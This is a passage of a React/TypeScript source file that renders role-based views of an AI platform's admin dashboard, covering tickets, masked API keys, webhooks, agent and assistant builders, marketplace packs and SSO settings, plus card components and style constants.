                onChange={(e) => callAction("/admin/dashboard/offers/upsert", { offer: { ...o, audience: e.target.value as Offer["audience"] } })}
                style={{ ...input, width: 120 }}
              >
                <option value="all">all</option>
                <option value="new_users">new users</option>
                <option value="enterprise">enterprise</option>
              </select>
              <button
                style={chip}
                onClick={async () => {
                  if (o.active && !confirmSafeAction({ title: `${o.name} offer`, actionLabel: "disable" })) return;
                  await callAction("/admin/dashboard/offers/toggle", { id: o.id });
                }}
              >
                {o.active ? "Disable" : "Enable"}
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Content Review Queue">
        <div style={{ display: "flex", justifyContent: "flex-end" }}>
          <button style={chip} onClick={() => setAdminLogs([])}>Clear View</button>
        </div>
        {adminLogs.slice(0, 12).map((l, i) => (
          <div key={i} style={log}>{l.type}</div>
        ))}
      </Card>
      <Card title="Support Tickets">
        <div style={{ display: "flex", gap: 8 }}>
          <input value={newTicket} onChange={(e) => setNewTicket(e.target.value)} placeholder="Ticket subject..." style={input} />
          <button style={primary} onClick={addSupportTicket}>Add</button>
        </div>
        {supportTickets.map((t) => (
          <div key={t.id} style={row}>
            <span>{t.id} • {t.subject}</span>
            <div style={{ display: "flex", gap: 6 }}>
              <select
                value={t.status}
                onChange={(e) => callAction("/admin/dashboard/tickets/upsert", { ticket: { ...t, status: e.target.value as SupportTicket["status"] } })}
                style={{ ...input, width: 110 }}
              >
                <option value="open">open</option>
                <option value="triaged">triaged</option>
                <option value="resolved">resolved</option>
              </select>
              <button
                style={chip}
                onClick={() =>
                  runGuarded(`ticket ${t.id}`, () => callAction("/admin/dashboard/tickets/delete", { id: t.id }), "close ticket")
                }
              >
                Close
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Activity & Reports">
        <Stat label="Logs" value={String(adminLogs.length)} />
        <Stat label="Audit events" value={String(adminAudit.length)} />
        <button style={chip} onClick={() => { setAdminLogs([]); setAdminAudit([]); }}>Clear View</button>
        <button style={chip} onClick={() => exportData("admin_audit", adminAudit)}>Export Report</button>
      </Card>
    </div>
  );

  const developerView = (
    <div style={grid}>
      {voiceOpsCopilotCard}
      {creatorEngineCard}
      {cortexCoreCard}
      <Card title="API Keys">
        <div style={log}>Primary key: {maskKey(String(import.meta.env.VITE_NEUROEDGE_API_KEY || ""))}</div>
        <button style={chip} onClick={addDevApiKey}>+ Create Key</button>
        {devApiKeys.map((k) => (
          <div key={k.id} style={row}>
            <span>{k.name} • {k.keyMasked}</span>
            <div style={{ display: "flex", gap: 6 }}>
              <button
                style={chip}
                onClick={() => {
                  const value = String(k.apiKey || k.keyMasked || "");
                  if (!value) return;
                  navigator.clipboard?.writeText(value);
                  addNotification({ type: "success", message: `Copied key for ${k.name}` });
                }}
              >
                Copy
              </button>
              <button
                style={chip}
                onClick={() => callAction("/admin/dashboard/api-keys/toggle", { id: k.id })}
              >
                {k.revoked ? "Restore" : "Revoke"}
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Usage Tracking">
        <Stat label="Requests" value={String(reqTotal)} />
        <Stat label="Total Tokens" value={tokenTotal.toLocaleString()} />
        <Stat label="Input Tokens" value={String(usage?.totals?.inputTokens || 0)} />
        <Stat label="Output Tokens" value={String(usage?.totals?.outputTokens || 0)} />
      </Card>
      <Card title="Webhook Setup">
        <input value={devWebhook} onChange={(e) => setDevWebhook(e.target.value)} placeholder="https://example.com/webhook" style={input} />
        <select value={webhookEvent} onChange={(e) => setWebhookEvent(e.target.value)} style={input}>
          <option value="chat.completed">chat.completed</option>
          <option value="ai.inference.done">ai.inference.done</option>
          <option value="agent.run.finished">agent.run.finished</option>
        </select>
        <button style={chip} onClick={addWebhook}>Save Webhook</button>
        {webhooks.map((w) => (
          <div key={w.id} style={row}>
            <span>{w.event} → {w.url}</span>
            <div style={{ display: "flex", gap: 6 }}>
              <button style={chip} onClick={() => testWebhook(w.id)}>Test</button>
              <button
                style={chip}
                onClick={() =>
                  runGuarded(`webhook ${w.url}`, () => callAction("/admin/dashboard/webhooks/delete", { id: w.id }))
                }
              >
                Delete
              </button>
            </div>
          </div>
        ))}
      </Card>
      <Card title="Model & Env">
        <select value={modelControl.model} onChange={(e) => setModelControl((p) => ({ ...p, model: e.target.value }))} style={input}>
          <option value="neuroedge-7b-instruct">neuroedge-7b-instruct</option>
          <option value="neuroedge-13b-instruct">neuroedge-13b-instruct</option>
          <option value="neuroedge-70b-router">neuroedge-70b-router</option>
        </select>
        <select value={devEnvironment} onChange={(e) => setDevEnvironment(e.target.value as any)} style={input}>
          <option value="dev">dev</option>
          <option value="staging">staging</option>
          <option value="prod">prod</option>
        </select>
      </Card>
      {neuroExpansionBuilderCard}
      <Card title="Debug Tools">
        <button style={chip} onClick={() => window.dispatchEvent(new CustomEvent("neuroedge:navigate", { detail: "history" }))}>Open History + Logs</button>
        <button style={chip} onClick={() => exportData("debug_logs", adminLogs.slice(0, 100))}>Export Debug Logs</button>
      </Card>
    </div>
  );

  const agentView = (
    <div style={grid}>
      <Card title="Agent Studio">
        <button style={primary} onClick={addAgentProfile}>+ Create Agent</button>
        {agentsLocal.length === 0 ? <div style={muted}>No agents configured yet.</div> : agentsLocal.map((a) => (
          <div key={a.id} style={{ ...row, ...(selectedAgentId === a.id ? { border: "1px solid rgba(125,211,252,0.55)", borderRadius: 8, padding: 6 } : {}) }}>
            <button style={chip} onClick={() => setSelectedAgentId(a.id)}>{a.name}</button>
            <button
              style={chip}
              onClick={() => runGuarded(`agent ${a.name}`, () => callAction("/admin/dashboard/agents/delete", { id: a.id }))}
            >
              Delete
            </button>
          </div>
        ))}
        {adminAgents.length > 0 && (
          <div style={{ marginTop: 8 }}>
            <div style={muted}>Live runtime agents</div>
            {adminAgents.map((a: any, i: number) => (
              <div key={`live-${i}`} style={log}>{a.name || `Agent-${i + 1}`} • {a.status || "running"}</div>
            ))}
          </div>
        )}
      </Card>
      <Card title="Knowledge Base & Prompting">
        <input type="file" style={{ color: "var(--ne-fg)" }} />
        {selectedAgent ? (
          <>
            <input
              value={selectedAgent.name}
              onChange={(e) => updateAgent(selectedAgent.id, { name: e.target.value })}
              style={input}
            />
            <textarea
              value={`You are ${selectedAgent.name}. Operate with ${selectedAgent.permission} permission and ${selectedAgent.memoryDays}d memory.`}
              readOnly
              style={{ ...input, minHeight: 120 }}
            />
          </>
        ) : (
          <div style={muted}>Select an agent to edit its settings.</div>
        )}
      </Card>
      <Card title="Integrations & Permissions">
        {selectedAgent ? (
          <>
            <div style={row}>
              <span>Permission</span>
              <select
                value={selectedAgent.permission}
                onChange={(e) => updateAgent(selectedAgent.id, { permission: e.target.value as AgentProfile["permission"] })}
                style={{ ...input, width: 140 }}
              >
                <option value="workspace">workspace</option>
                <option value="project">project</option>
                <option value="read_only">read_only</option>
              </select>
            </div>
            {["research", "code", "math", "files", "webhooks", "chat"].map((tool) => (
              <div key={tool} style={row}>
                <span>{tool}</span>
                <button style={chip} onClick={() => toggleAgentTool(selectedAgent.id, tool)}>
                  {selectedAgent.tools.includes(tool) ? "Enabled" : "Disabled"}
                </button>
              </div>
            ))}
          </>
        ) : (
          <div style={muted}>No agent selected.</div>
        )}
      </Card>
      <Card title="Analytics + Memory Control">
        <Stat label="Agent events" value={String(adminLogs.filter((e) => String(e.type).includes("agent")).length)} />
        {selectedAgent ? (
          <div style={{ display: "flex", gap: 8 }}>
            <input
              type="number"
              value={selectedAgent.memoryDays}
              onChange={(e) => updateAgent(selectedAgent.id, { memoryDays: Number(e.target.value) || 1 })}
              style={{ ...input, width: 120 }}
            />
            <button style={chip} onClick={() => addNotification({ type: "success", message: "Memory policy updated." })}>Save</button>
          </div>
        ) : (
          <div style={muted}>Select an agent to set memory policy.</div>
        )}
      </Card>
    </div>
  );

  const userView = (
    <div style={grid}>
      {voiceOpsCopilotCard}
      {creatorEngineCard}
      {cortexCoreCard}
      <Card title="Chat & Prompt Workspace">
        <Stat label="Chats" value={String(conversationStats.chats)} />
        <Stat label="Messages" value={String(conversationStats.messages)} />
        <Stat label="Latest Chat" value={conversationStats.latest} />
      </Card>
      {ownerComputeCard}
      {ownerPayoutCard}
      {userProtectionCard}
      <Card title="My Assistant Builder (User Freedom)">
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button style={primary} onClick={addUserAssistant}>+ Create Assistant</button>
          <button style={chip} onClick={() => addUserAssistantFromTemplate("study_tutor")}>Template: Study Tutor</button>
          <button style={chip} onClick={() => addUserAssistantFromTemplate("research_analyst")}>Template: Research Analyst</button>
          <button style={chip} onClick={() => addUserAssistantFromTemplate("product_manager")}>Template: Product Manager</button>
          <button style={chip} onClick={() => addUserAssistantFromTemplate("translator")}>Template: Translator</button>
          <button style={chip} onClick={() => addUserAssistantFromTemplate("fitness_coach")}>Template: Fitness Coach</button>
          <label style={chip}>
            Import Profile
            <input
              type="file"
              accept="application/json,.json"
              style={{ display: "none" }}
              onChange={(e) => importUserAssistant(e.target.files)}
            />
          </label>
          {selectedUserAssistant && (
            <>
              <button style={chip} onClick={() => activateUserAssistant(selectedUserAssistant.id)}>Set Active in Chat</button>
              <button style={chip} onClick={() => setDefaultUserAssistant(selectedUserAssistant.id)}>Set Startup Default</button>
              <button style={chip} onClick={() => duplicateUserAssistant(selectedUserAssistant.id)}>Duplicate</button>
              <button style={chip} onClick={() => exportUserAssistant(selectedUserAssistant.id)}>Export</button>
              <button style={chip} onClick={() => deleteUserAssistant(selectedUserAssistant.id)}>Delete</button>
            </>
          )}
        </div>
        <div style={{ display: "grid", gap: 8, marginTop: 8 }}>
          {userAssistants.length === 0 && <div style={muted}>No personal assistants yet. Create one to start customizing.</div>}
          {userAssistants.map((a) => (
            <div
              key={a.id}
              style={{
                ...row,
                border: selectedUserAssistantId === a.id ? "1px solid rgba(59,130,246,0.65)" : "1px solid rgba(148,163,184,0.25)",
                borderRadius: 8,
                padding: 8,
              }}
            >
              <button style={chip} onClick={() => setSelectedUserAssistantId(a.id)}>
                {a.avatarEmoji || "🤖"} {a.name}
              </button>
              <span style={{ fontSize: 12, opacity: 0.85 }}>
                {a.tone} • {a.language} • {a.memoryDays}d • {a.tools.join(", ")}
                {defaultUserAssistantId === a.id ? " • startup default" : ""}
              </span>
            </div>
          ))}
        </div>
        {selectedUserAssistant ? (
          <div style={{ display: "grid", gap: 8, marginTop: 8 }}>
            <input
              value={selectedUserAssistant.name}
              onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { name: e.target.value })}
              placeholder="Assistant name"
              style={input}
            />
            <input
              value={selectedUserAssistant.avatarEmoji || ""}
              onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { avatarEmoji: e.target.value.slice(0, 2) })}
              placeholder="Avatar emoji (e.g. 🤖)"
              style={input}
            />
            <textarea
              value={selectedUserAssistant.rolePrompt}
              onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { rolePrompt: e.target.value })}
              placeholder="Assistant instruction / personality"
              style={{ ...input, minHeight: 90 }}
            />
            <textarea
              value={selectedUserAssistant.startupPrompt || ""}
              onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { startupPrompt: e.target.value })}
              placeholder="Startup behavior prompt (optional)"
              style={{ ...input, minHeight: 72 }}
            />
            <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
              <select
                value={selectedUserAssistant.tone}
                onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { tone: e.target.value as UserAssistantProfile["tone"] })}
                style={input}
              >
                <option value="balanced">balanced</option>
                <option value="formal">formal</option>
                <option value="casual">casual</option>
                <option value="technical">technical</option>
                <option value="creative">creative</option>
              </select>
              <input
                value={selectedUserAssistant.language}
                onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { language: e.target.value })}
                placeholder="Language code (en, sw, fr...)"
                style={input}
              />
              <input
                value={selectedUserAssistant.domainFocus || "general"}
                onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { domainFocus: e.target.value })}
                placeholder="Domain focus (general, coding, school, finance...)"
                style={input}
              />
              <select
                value={selectedUserAssistant.responseMode || "balanced"}
                onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { responseMode: e.target.value as UserAssistantProfile["responseMode"] })}
                style={input}
              >
                <option value="concise">response: concise</option>
                <option value="balanced">response: balanced</option>
                <option value="detailed">response: detailed</option>
              </select>
              <select
                value={selectedUserAssistant.memoryMode || "long_term"}
                onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { memoryMode: e.target.value as UserAssistantProfile["memoryMode"] })}
                style={input}
              >
                <option value="session">memory: session</option>
                <option value="long_term">memory: long_term</option>
              </select>
              <input
                type="number"
                min={1}
                max={365}
                value={selectedUserAssistant.memoryDays}
                onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { memoryDays: Number(e.target.value) || 1 })}
                placeholder="Memory days"
                style={input}
              />
              <input
                type="number"
                min={0}
                max={1}
                step={0.05}
                value={selectedUserAssistant.creativity}
                onChange={(e) => updateUserAssistant(selectedUserAssistant.id, { creativity: Number(e.target.value) || 0 })}
                placeholder="Creativity"
                style={input}
              />
            </div>
            <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
              {["chat", "research", "code", "math", "files", "voice", "web"].map((tool) => (
                <button key={tool} style={chip} onClick={() => toggleUserAssistantTool(selectedUserAssistant.id, tool)}>
                  {tool}: {selectedUserAssistant.tools.includes(tool) ? "on" : "off"}
                </button>
              ))}
            </div>
            <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
              <button style={chip} onClick={() => updateUserAssistant(selectedUserAssistant.id, { privacyMode: !selectedUserAssistant.privacyMode })}>
                Privacy mode: {selectedUserAssistant.privacyMode ? "on" : "off"}
              </button>
              <button style={chip} onClick={() => updateUserAssistant(selectedUserAssistant.id, { safeMode: !selectedUserAssistant.safeMode })}>
                Safety mode: {selectedUserAssistant.safeMode ? "on" : "off"}
              </button>
              <button style={chip} onClick={() => updateUserAssistant(selectedUserAssistant.id, { autoCitations: !selectedUserAssistant.autoCitations })}>
                Auto citations: {selectedUserAssistant.autoCitations ? "on" : "off"}
              </button>
            </div>
            <div style={{ border: "1px solid rgba(148,163,184,0.2)", borderRadius: 10, padding: 8, display: "grid", gap: 8 }}>
              <strong>Knowledge Base (Per Assistant)</strong>
              <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
                <input
                  value={assistantKnowledgeUrlDraft}
                  onChange={(e) => setAssistantKnowledgeUrlDraft(e.target.value)}
                  placeholder="Add URL source for this assistant"
                  style={{ ...input, minWidth: 240 }}
                />
                <button style={chip} onClick={addKnowledgeUrlToAssistant}>Add URL</button>
                <label style={chip}>
                  Attach files
                  <input
                    type="file"
                    multiple
                    style={{ display: "none" }}
                    onChange={(e) => attachKnowledgeFilesToAssistant(e.target.files)}
                  />
                </label>
              </div>
              {(selectedUserAssistant.knowledgeSources || []).map((u) => (
                <div key={u} style={row}>
                  <span style={{ fontSize: 12 }}>{u}</span>
                  <button style={chip} onClick={() => removeKnowledgeUrlFromAssistant(u)}>Remove</button>
                </div>
              ))}
              {(selectedUserAssistant.knowledgeFiles || []).map((f) => (
                <div key={f.id} style={row}>
                  <span style={{ fontSize: 12 }}>
                    {f.name} • {(f.size / 1024).toFixed(1)} KB • {f.mime}
                  </span>
                  <button style={chip} onClick={() => removeKnowledgeFileFromAssistant(f.id)}>Remove</button>
                </div>
              ))}
            </div>
            <div style={{ border: "1px solid rgba(148,163,184,0.2)", borderRadius: 10, padding: 8, display: "grid", gap: 8 }}>
              <strong>Usage Analytics + Quality Score</strong>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(4, minmax(100px, 1fr))", gap: 8 }}>
                <Stat label="Turns" value={String(assistantAnalytics[selectedUserAssistant.id]?.turns || 0)} />
                <Stat label="Avg Confidence" value={`${Math.round((assistantAnalytics[selectedUserAssistant.id]?.avgConfidence || 0) * 100)}%`} />
                <Stat label="Citation Coverage" value={`${Math.round((assistantAnalytics[selectedUserAssistant.id]?.citationCoverage || 0) * 100)}%`} />
                <Stat label="Quality Score" value={`${assistantQualityScore(selectedUserAssistant.id)} / 100`} />
              </div>
              <div style={muted}>
                Reactions: 👍 {assistantAnalytics[selectedUserAssistant.id]?.up || 0} • 👎 {assistantAnalytics[selectedUserAssistant.id]?.down || 0} • 😂 {assistantAnalytics[selectedUserAssistant.id]?.laugh || 0} • 😢 {assistantAnalytics[selectedUserAssistant.id]?.sad || 0}
              </div>
            </div>
            <div style={{ border: "1px solid rgba(148,163,184,0.2)", borderRadius: 10, padding: 8, display: "grid", gap: 8 }}>
              <strong>Assistant Sharing Marketplace</strong>
              <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
                <input
                  value={marketplaceDescription}
                  onChange={(e) => setMarketplaceDescription(e.target.value)}
                  placeholder="Pack description"
                  style={{ ...input, minWidth: 220 }}
                />
                <input
                  value={marketplaceTagsCsv}
                  onChange={(e) => setMarketplaceTagsCsv(e.target.value)}
                  placeholder="Tags (comma-separated)"
                  style={{ ...input, minWidth: 180 }}
                />
                <select
                  value={marketplaceVisibility}
                  onChange={(e) => setMarketplaceVisibility(e.target.value as "public" | "private")}
                  style={input}
                >
                  <option value="public">public pack</option>
                  <option value="private">private pack</option>
                </select>
                <button style={primary} onClick={publishAssistantPack}>Publish Pack</button>
              </div>
              <input
                value={marketplaceSearch}
                onChange={(e) => setMarketplaceSearch(e.target.value)}
                placeholder="Search packs by name, owner, tag..."
                style={input}
              />
              {filteredMarketplacePacks.slice(0, 20).map((pack) => (
                <div key={pack.id} style={{ ...row, border: "1px solid rgba(148,163,184,0.2)", borderRadius: 8, padding: 8 }}>
                  <span style={{ fontSize: 12 }}>
                    {pack.name} • {pack.visibility} • owner: {pack.owner} • downloads: {pack.downloads} • rating: {pack.rating.toFixed(1)}
                  </span>
                  <div style={{ display: "flex", gap: 6 }}>
                    <button style={chip} onClick={() => installAssistantPack(pack.id)}>Install</button>
                    <button style={chip} onClick={() => rateAssistantPack(pack.id, 5)}>Rate ★★★★★</button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        ) : null}
        <div style={{ ...log, marginTop: 8 }}>
          Live features: assistant templates, private/public marketplace packs, per-assistant knowledge attachments, per-assistant telemetry, startup defaults, and active profile sync into chat.
        </div>
      </Card>
      <Card title="Plan & Usage">
        <Stat label="Plan" value={plans.find((p) => p.active)?.name || "Free"} />
        <Stat label="Requests" value={String(reqTotal)} />
        <Stat label="Tokens" value={tokenTotal.toLocaleString()} />
      </Card>
      <Card title="Payment Details">
        <div style={log}>Billing email: {payment.billingEmail || "not set"}</div>
        <div style={log}>Card: {payment.cardNumberMasked || "not set"}</div>
      </Card>
      <Card title="Saved Files & Notifications">
        <input type="file" style={{ color: "var(--ne-fg)" }} />
        <button style={chip} onClick={() => addNotification({ type: "info", message: "Notifications configured." })}>Configure Notifications</button>
      </Card>
      <Card title="Saved Prompts">
        <input value={newPromptTitle} onChange={(e) => setNewPromptTitle(e.target.value)} placeholder="Prompt title" style={input} />
        <textarea value={newPromptText} onChange={(e) => setNewPromptText(e.target.value)} placeholder="Prompt text..." style={{ ...input, minHeight: 90 }} />
        <button style={primary} onClick={addSavedPrompt}>Save Prompt</button>
        {savedPrompts.map((p) => (
          <div key={p.id} style={row}>
            <span>{p.title}</span>
            <div style={{ display: "flex", gap: 6 }}>
              <button style={chip} onClick={() => navigator.clipboard?.writeText(p.text)}>Copy</button>
              <button
                style={chip}
                onClick={() =>
                  canAccessAdminOps
                    ? runGuarded(`prompt ${p.title}`, () => callAction("/admin/dashboard/prompts/delete", { id: p.id }))
                    : setSavedPrompts((prev) => prev.filter((x) => x.id !== p.id))
                }
              >
                Delete
              </button>
            </div>
          </div>
        ))}
      </Card>
    </div>
  );

  const enterpriseView = (
    <div style={grid}>
      {voiceOpsCopilotCard}
      {deviceProtectionCard}
      {aegisShieldCard}
      {loanOpsShieldCard}
      {creatorEngineCard}
      {cortexCoreCard}
      <Card title="Team Roles & Department Controls">
        {users.map((u) => (
          <div key={u.id} style={row}>
            <span>{u.name}</span>
            <select value={u.role} onChange={(e) => assignRole(u.id, e.target.value as UserRecord["role"])} style={{ ...input, width: 130 }}>
              <option value="user">user</option>
              <option value="moderator">moderator</option>
              <option value="admin">admin</option>
              <option value="developer">developer</option>
              <option value="founder">founder</option>
            </select>
          </div>
        ))}
      </Card>
      <Card title="Usage by Department">
        <div style={{ display: "grid", gap: 8 }}>
          <div style={{ display: "flex", gap: 8 }}>
            <input value={newDepartmentName} onChange={(e) => setNewDepartmentName(e.target.value)} placeholder="Department name" style={input} />
            <input value={newDepartmentMembers} onChange={(e) => setNewDepartmentMembers(e.target.value)} placeholder="Members" style={{ ...input, maxWidth: 100 }} />
            <input value={newDepartmentTokens} onChange={(e) => setNewDepartmentTokens(e.target.value)} placeholder="Tokens/month" style={{ ...input, maxWidth: 140 }} />
            <button style={primary} onClick={addDepartment}>Add</button>
          </div>
          {enterpriseDepartments.map((d) => (
            <div key={d.id} style={row}>
              <span>{d.name}: {d.tokensPerMonth.toLocaleString()} tokens / month</span>
              <div style={{ display: "flex", gap: 6 }}>
                <input
                  type="number"
                  value={d.members}
                  onChange={(e) => setEnterpriseDepartments((prev) => prev.map((x) => (x.id === d.id ? { ...x, members: Number(e.target.value) || 1 } : x)))}
                  onBlur={(e) => callAction("/admin/dashboard/enterprise/departments/upsert", { department: { ...d, members: Number(e.target.value) || 1 } })}
                  style={{ ...input, width: 80 }}
                />
                <button
                  style={chip}
                  onClick={() =>
                    runGuarded(`department ${d.name}`, () => callAction("/admin/dashboard/enterprise/departments/delete", { id: d.id }), "remove")
                  }
                >
                  Remove
                </button>
              </div>
            </div>
          ))}
        </div>
      </Card>
      <Card title="Billing, Audit, Compliance">
        <button style={chip} onClick={() => exportData("enterprise_audit", adminAudit)}>Export Audit Logs</button>
        <button style={chip} onClick={() => exportData("enterprise_usage", usage)}>Export Usage</button>
      </Card>
      <Card title="SSO & Governance">
        <div style={row}>
          <span>Enable SSO</span>
          <button style={chip} onClick={() => setSsoConfig((prev: any) => ({ ...prev, enabled: !prev.enabled }))}>
            {ssoConfig.enabled ? "Enabled" : "Disabled"}
          </button>
        </div>
        <select
          value={ssoConfig.provider}
          onChange={(e) => setSsoConfig((prev: any) => ({ ...prev, provider: e.target.value }))}
          style={input}
        >
          <option value="okta">okta</option>
          <option value="entra">entra</option>
          <option value="auth0">auth0</option>
          <option value="google-workspace">google-workspace</option>
        </select>
        <input value={ssoConfig.domain} onChange={(e) => setSsoConfig((prev: any) => ({ ...prev, domain: e.target.value }))} placeholder="Company domain" style={input} />
        <input value={ssoConfig.clientId} onChange={(e) => setSsoConfig((prev: any) => ({ ...prev, clientId: e.target.value }))} placeholder="Client ID" style={input} />
        <input value={ssoConfig.metadataUrl} onChange={(e) => setSsoConfig((prev: any) => ({ ...prev, metadataUrl: e.target.value }))} placeholder="Metadata URL" style={input} />
        <button style={primary} onClick={() => callAction("/admin/dashboard/enterprise/sso/save", { ssoConfig })}>Save SSO</button>
      </Card>
    </div>
  );

  return (
    <div style={page}>
      <div style={hero}>
        <h2 style={{ margin: 0 }}>NeuroEdge Sovereign Command Center</h2>
        <div style={muted}>
          {dashboardRole === "founder" || dashboardRole === "admin"
            ? "Leadership orchestration for product, revenue, agents, security, and enterprise operations."
            : "Your workspace for chats, agents, usage, and account operations."}
        </div>
      </div>

      {canAccessAdminOps ? (
        <div style={serviceGrid}>
          {services.map((s) => (
            <div key={s.name} style={serviceChip(s.status)}>
              <strong>{s.name}</strong>
              <span>{s.detail}</span>
            </div>
          ))}
        </div>
      ) : (
        <div style={serviceGrid}>
          <div style={serviceChip("online")}>
            <strong>NeuroEdge</strong>
            <span>Ready</span>
          </div>
        </div>
      )}

      <div style={tabs}>
        {[
          ["founder", "Founder"],
          ["admin", "Admin"],
          ["developer", "Developer"],
          ["agents", "AI Agents"],
          ["user", "User"],
          ["enterprise", "Enterprise"],
        ]
          .filter(([id]) => allowedViews.includes(id as View))
          .map(([id, label]) => (
          <button key={id} style={tab(view === id)} onClick={() => setView(id as View)}>
            {label}
          </button>
          ))}
      </div>

      <div style={{ ...card, marginBottom: 10 }}>
        <div style={{ ...cardHeader }}>
          <h3 style={{ margin: 0 }}>Dashboard Search Assistant</h3>
        </div>
        <div style={{ padding: "0.8rem", display: "grid", gap: 8 }}>
          <input
            value={dashboardAssistantQuery}
            onChange={(e) => setDashboardAssistantQuery(e.target.value)}
            placeholder="Ask where to find something: e.g. rollback, api key, twin report, media generation, billing..."
            style={input}
          />
          <div style={{ ...muted, fontSize: "0.84rem" }}>
            Assistant scope: {dashboardRole}. It surfaces pages and sections you can access, then guides you directly.
          </div>
          <div style={{ display: "grid", gap: 6, maxHeight: 220, overflowY: "auto" }}>
            {dashboardAssistantResults.length === 0 ? (
              <div style={muted}>No match. Try words like: security, twin, creator, billing, links, api, sso.</div>
            ) : (
              dashboardAssistantResults.map((item) => (
                <div key={item.id} style={{ ...log, margin: 0 }}>
                  <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "center" }}>
                    <div>
                      <div style={{ fontWeight: 700 }}>{item.title}</div>
                      <div style={muted}>{item.summary}</div>
                    </div>
                    <button
                      style={chip}
                      onClick={() => {
                        setView(item.view);
                        addNotification({ type: "info", message: `Opened ${item.view} dashboard for ${item.title}.` });
                      }}
                    >
                      Open
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      {view === "founder" && founderView}
      {view === "admin" && adminView}
      {view === "developer" && developerView}
      {view === "agents" && agentView}
      {view === "user" && userView}
      {view === "enterprise" && enterpriseView}

      <div style={{ marginTop: 14, color: "#94a3b8", fontSize: "0.8rem" }}>
        {canAccessAdminOps ? (
          <>
            Kernel Snapshot: {kernels.map((k) => `${k.name}:${k.status}`).join(" | ") || "none"}
            {" • "}
            Messages: {localMsgStats.total} (errors {localMsgStats.errors}, warnings {localMsgStats.warnings})
            {" • "}
            Version: {adminVersion.orchestratorVersion || "unknown"} / Doctrine v{String(adminVersion.doctrineVersion || "-")}
          </>
        ) : (
          <>NeuroEdge workspace active</>
        )}
      </div>
    </div>
  );
};

const Card: React.FC<{ title: string; children: React.ReactNode; wide?: boolean }> = ({ title, children, wide = false }) => {
  const [minimized, setMinimized] = useState(false);
  const [maximized, setMaximized] = useState(false);
  const [closed, setClosed] = useState(false);

  if (closed) {
    return (
      <button style={{ ...chip, justifySelf: "start" }} onClick={() => setClosed(false)}>
        Reopen: {title}
      </button>
    );
  }

  return (
    <div style={maximized ? { ...card, ...cardMaximized } : { ...card, ...(wide ? cardWide : null) }}>
      <div style={cardHeader}>
        <h3 style={{ margin: 0 }}>{title}</h3>
        <div style={{ display: "flex", gap: 6 }}>
          <button style={winBtn} onClick={() => setMinimized((v) => !v)} title={minimized ? "Expand" : "Minimize"}>
            {minimized ? "▢" : "–"}
          </button>
          <button style={winBtn} onClick={() => setMaximized((v) => !v)} title={maximized ? "Restore" : "Maximize"}>
            {maximized ? "❐" : "□"}
          </button>
          <button style={winBtn} onClick={() => setClosed(true)} title="Close">
            ✕
          </button>
        </div>
      </div>
      {!minimized && <div style={{ display: "grid", gap: 8, minWidth: 0 }}>{children}</div>}
    </div>
  );
};

const Stat: React.FC<{ label: string; value: string }> = ({ label, value }) => (
  <div style={row}>
    <span style={muted}>{label}</span>
    <strong>{value}</strong>
  </div>
);

function formatBytes(bytes: number) {
  if (!bytes) return "0 B";
  const units = ["B", "KB", "MB", "GB", "TB"];
  let n = bytes;
  let i = 0;
  while (n >= 1024 && i < units.length - 1) {
    n /= 1024;
    i += 1;
  }
  return `${n.toFixed(1)} ${units[i]}`;
}

function maskKey(key: string) {
  if (!key) return "not set";
  if (key.length < 8) return "****";
  return `${key.slice(0, 4)}...${key.slice(-4)}`;
}

const page: React.CSSProperties = {
  padding: "1.2rem",
  overflowY: "auto",
  height: "100%",
  background:
    "radial-gradient(circle at 0% 0%, rgba(56,189,248,0.2), transparent 30%), radial-gradient(circle at 100% 0%, rgba(37,99,235,0.2), transparent 30%), linear-gradient(180deg,#0f172a,#0b1220)",
  color: "#e2e8f0",
  fontFamily: "'Space Grotesk', system-ui, sans-serif",
};

const hero: React.CSSProperties = {
  marginBottom: 12,
  padding: "0.9rem 1rem",
  borderRadius: 14,
  border: "1px solid rgba(148,163,184,0.28)",
  background: "rgba(15,23,42,0.72)",
};

const serviceGrid: React.CSSProperties = {
  display: "flex",
  flexWrap: "wrap",
  gap: 8,
  marginBottom: 12,
};

const serviceChip = (status: ServiceStatus["status"]): React.CSSProperties => ({
  display: "grid",
  minWidth: 170,
  gap: 3,
  borderRadius: 10,
  border: "1px solid rgba(148,163,184,0.25)",
  padding: "0.5rem 0.66rem",
  background:
    status === "online" ? "rgba(34,197,94,0.16)" : status === "degraded" ? "rgba(250,204,21,0.16)" : "rgba(239,68,68,0.16)",
});

const tabs: React.CSSProperties = { display: "flex", flexWrap: "wrap", gap: 8, marginBottom: 12 };

const tab = (active: boolean): React.CSSProperties => ({
  border: active ? "1px solid rgba(125,211,252,0.8)" : "1px solid rgba(148,163,184,0.3)",
  borderRadius: 9,
  background: active ? "rgba(30,64,175,0.35)" : "rgba(15,23,42,0.7)",
  color: "#e2e8f0",
  padding: "0.42rem 0.72rem",
  cursor: "pointer",
  fontSize: "0.78rem",
});

const grid: React.CSSProperties = {
  display: "grid",
  gridTemplateColumns: "repeat(auto-fill, minmax(320px, 1fr))",
  gap: 10,
};

const card: React.CSSProperties = {
  borderRadius: 14,
  border: "1px solid rgba(148,163,184,0.24)",
  background: "rgba(15,23,42,0.74)",
  padding: "0.88rem",
  boxShadow: "0 10px 30px rgba(2,6,23,0.35)",
  overflow: "hidden",
  minWidth: 0,
};
const cardWide: React.CSSProperties = {
